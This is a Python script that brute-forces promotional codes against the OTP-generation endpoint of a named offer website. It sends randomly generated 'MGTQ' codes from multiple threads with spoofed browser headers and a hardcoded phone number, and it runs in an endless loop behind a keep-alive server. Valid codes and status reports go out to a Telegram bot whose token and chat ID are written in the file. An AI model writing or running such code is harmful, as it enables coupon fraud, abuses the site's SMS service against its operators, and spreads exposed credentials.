import os
import time
import random
import string
import json
import threading
import requests
import concurrent.futures
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import defaultdict
from typing import Dict
from threading import Lock

# ================== CONFIGURATION ==================
BASE_URL = "https://www.ssw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "9738772627"

NUM_CODES = 300
MAX_WORKERS = 10
DELAY_PER_THREAD = 0.7
STATUS_INTERVAL = 100

# Telegram Configuration
TELEGRAM_TOKEN = "8789555036:AAGw-EovbhVHoI81lD6QJ9AeFhn4eJNnFaY"
TELEGRAM_CHAT_ID = "5177144784"

print_lock = Lock()
code_counter = 0
valid_counter = 0
last_status_counter = 0
last_valid_counter = 0

# Detailed error counters
error_counts = {
    "HTTP403": 0,
    "HTTPOther": 0,
    "Timeout": 0,
    "ConnectionError": 0,
    "JSONParse": 0,
    "UnknownStatus": 0,
    "Generic": 0
}
invalid_counter = 0

# ================== TELEGRAM FUNCTIONS ==================
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except Exception as e:
        print(f"Telegram error: {e}")

def send_detailed_status():
    global code_counter, valid_counter, last_status_counter, last_valid_counter, invalid_counter
    
    # Calculate differences since last status
    codes_in_interval = code_counter - last_status_counter
    valids_in_interval = valid_counter - last_valid_counter
    invalids_in_interval = codes_in_interval - valids_in_interval - sum(error_counts.values()) + (error_counts["HTTP403"] + error_counts["HTTPOther"] + error_counts["Timeout"] + error_counts["ConnectionError"] + error_counts["JSONParse"] + error_counts["UnknownStatus"] + error_counts["Generic"])
    
    # Build status message
    msg = f"📊 **Status Report**\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"✅ **{codes_in_interval} codes scanned**\n"
    msg += f"🎯 **{valids_in_interval} valid codes**\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"❌ **Errors:**\n"
    
    if error_counts["HTTP403"] > 0:
        msg += f"   🔒 HTTP 403 Error: {error_counts['HTTP403']}\n"
    if error_counts["HTTPOther"] > 0:
        msg += f"   ⚠️ HTTP {error_counts['HTTPOther']} Error: {error_counts['HTTPOther']}\n"
    if error_counts["Timeout"] > 0:
        msg += f"   ⏱️ Timeout: {error_counts['Timeout']}\n"
    if error_counts["ConnectionError"] > 0:
        msg += f"   🌐 Network Error: {error_counts['ConnectionError']}\n"
    if error_counts["JSONParse"] > 0:
        msg += f"   📄 JSON Parse Error: {error_counts['JSONParse']}\n"
    if error_counts["UnknownStatus"] > 0:
        msg += f"   ❓ Unknown Status: {error_counts['UnknownStatus']}\n"
    if error_counts["Generic"] > 0:
        msg += f"   💥 Generic Error: {error_counts['Generic']}\n"
    
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"❌ **{invalids_in_interval} invalid codes**\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📈 **Total so far:** {code_counter} codes | {valid_counter} valid"
    
    send_telegram_message(msg)
    
    # Reset counters for next interval
    last_status_counter = code_counter
    last_valid_counter = valid_counter
    
    # Reset error counters after sending
    for key in error_counts:
        error_counts[key] = 0

def report_error(error_type, details=""):
    if error_type in error_counts:
        error_counts[error_type] += 1

# ================== CODE GENERATION ==================
def generate_random_code() -> str:
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choices(chars, k=6))
    return prefix + random_part

# ================== CODE CHECKER ==================
def check_code(code: str, mobile: str = TEST_MOBILE) -> Dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ossw.theofferclub.in/",
        "Origin": "https://www.ossw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    data = {"phone": mobile, "ccode": code}
    start_time = time.time()
    
    try:
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        response_time = round((time.time() - start_time) * 1000, 2)
        
        result = {
            "code": code,
            "status_code": response.status_code,
            "response_time_ms": response_time,
            "raw_response": None,
            "valid": False,
            "message": "",
            "site_status": ""
        }
        
        if response.status_code == 200:
            try:
                json_resp = response.json()
                result["raw_response"] = json_resp
                result["site_status"] = json_resp.get("status", "unknown")
                
                if json_resp.get("status") == "success":
                    result["valid"] = True
                    result["message"] = "✅ VALID - OTP Sent Successfully"
                elif json_resp.get("status") == "failure":
                    msg = json_resp.get("msg1") or json_resp.get("msg") or "Unknown failure"
                    result["message"] = f"❌ {msg}"
                elif json_resp.get("status") == "code_failure":
                    result["message"] = f"❌ Invalid Code: {json_resp.get('msg', 'N/A')}"
                else:
                    result["message"] = f"❌ Unknown status: {json_resp.get('status')}"
                    report_error("UnknownStatus")
            except Exception as e:
                result["raw_response"] = response.text
                result["message"] = "❌ Failed to parse JSON"
                report_error("JSONParse")
        elif response.status_code == 403:
            result["message"] = f"❌ HTTP Error {response.status_code} (Blocked)"
            report_error("HTTP403")
        else:
            result["message"] = f"❌ HTTP Error {response.status_code}"
            report_error("HTTPOther")
            
        return result
        
    except requests.exceptions.Timeout:
        report_error("Timeout")
        return {"code": code, "valid": False, "message": "❌ Timeout", "status_code": 0}
    except requests.exceptions.ConnectionError:
        report_error("ConnectionError")
        return {"code": code, "valid": False, "message": "❌ Connection error", "status_code": 0}
    except Exception as e:
        report_error("Generic")
        return {
            "code": code,
            "status_code": 0,
            "response_time_ms": round((time.time() - start_time) * 1000, 2),
            "raw_response": str(e),
            "valid": False,
            "message": f"❌ Request Error: {str(e)}",
            "site_status": "error"
        }

# ================== PROCESS CODE ==================
def process_code(code: str):
    global code_counter, valid_counter
    result = check_code(code)
    
    with print_lock:
        code_counter += 1
        print(f"\n🔍 Code: {code}")
        print(f"   Status : {result['message']}")
        print(f"   HTTP   : {result.get('status_code', 'N/A')} | Time: {result.get('response_time_ms', 'N/A')}ms")
        
        if result["valid"]:
            valid_counter += 1
            # Send to Telegram immediately
            telegram_msg = f"🎉 VALID CODE FOUND!\n🔑 Code: {code}\n📱 Mobile: {TEST_MOBILE}\n⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}"
            send_telegram_message(telegram_msg)
            
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code} | {TEST_MOBILE} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f"🎉🎉 VALID CODE FOUND: {code} 🎉🎉\n")
        
        # Send detailed status every STATUS_INTERVAL codes
        if code_counter % STATUS_INTERVAL == 0:
            send_detailed_status()
    
    time.sleep(DELAY_PER_THREAD)
    return result

# ================== VALIDATOR LOOP ==================
def run_validator():
    global code_counter, valid_counter, last_status_counter, last_valid_counter
    
    send_telegram_message("🚀 Validator started (with detailed status reports)")
    send_telegram_message(f"🎯 Target mobile: {TEST_MOBILE}")
    send_telegram_message(f"⚙️ Config: {NUM_CODES} codes/batch, {MAX_WORKERS} threads")
    
    print("🚀 Oaksmith Multi-Threaded Code Generator & Validator")
    print("=" * 90)
    print(f"Generating {NUM_CODES} codes | Threads: {MAX_WORKERS} | Mobile: {TEST_MOBILE}")
    print("=" * 90)
    
    # Initialize trackers
    last_status_counter = 0
    last_valid_counter = 0
    
    while True:
        codes = [generate_random_code() for _ in range(NUM_CODES)]
        valid_codes = []
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(process_code, code) for code in codes]
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result["valid"]:
                        valid_codes.append(result["code"])
                except Exception as e:
                    with print_lock:
                        print(f"Thread error: {e}")
        
        total_time = round(time.time() - start_time, 2)
        
        with print_lock:
            print("\n" + "="*90)
            print("🎯 BATCH SUMMARY")
            print("="*90)
            print(f"Total codes tested : {NUM_CODES}")
            print(f"Valid codes found  : {len(valid_codes)}")
            print(f"Total time         : {total_time} seconds")
            print(f"Average speed      : {round(NUM_CODES/total_time, 1)} codes/sec")
            print("="*90 + "\n")
        
        time.sleep(5)

# ================== HTTP KEEP-ALIVE ==================
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Validator running - detailed status reports")
    def log_message(self, format, *args):
        pass

def start_http_server():
    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"HTTP keep-alive server on port {port}")
    server.serve_forever()

# ================== MAIN ==================
if __name__ == "__main__":
    threading.Thread(target=run_validator, daemon=True).start()
    start_http_server()
